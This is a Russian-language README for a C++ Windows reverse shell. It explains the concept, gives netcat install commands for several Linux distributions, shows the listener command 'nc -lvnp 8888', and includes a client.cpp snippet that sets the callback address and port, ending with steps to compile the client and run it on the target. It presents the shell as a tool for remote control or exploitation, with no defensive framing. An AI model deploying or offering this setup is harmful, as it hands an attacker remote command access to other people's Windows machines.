# Windows Reverse Shell

Простая реализация Reverse Shell на C++ для Windows.

## Описание

В качестве сервера используется Natcat.

Reverse Shell (обратная оболочка) — это тип сетевого соединения, при котором уязвимая система инициирует исходящее соединение с удалённым сервером (в отличие от обычного shell, где сервер ожидает подключения от клиента). Это используется, например, в целях удалённого управления или эксплуатации системы.

## Запуск

### Сервер
1. Установите natcat:

#### Для Arch Linux и производных (например, Manjaro):
```bash
sudo pacman -S gnu-netcat
```

#### Для Ubuntu/Debian и производных:
```bash
sudo apt update
sudo apt install netcat
```

#### Для Fedora:
```bash
sudo dnf install nc
```

#### Для CentOS/RHEL (8 и новее):
```bash
sudo dnf install nc
```

#### Для CentOS/RHEL (7 и старее):
```bash
sudo yum install nc
```

2. Запустите сервер netcat на выбранном порте:

```bash
nc -lvnp 8888
```

### Клиент

1. Настройте порт и адрес удалённого сервера natcat в файле client.cpp:

```C++
server.sin_port = htons(8888); // Порт, на котором работает сервер

if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) {
```

2. Скомпилируйте клиент

3. Запустите исполняемый exe файл на клиенте
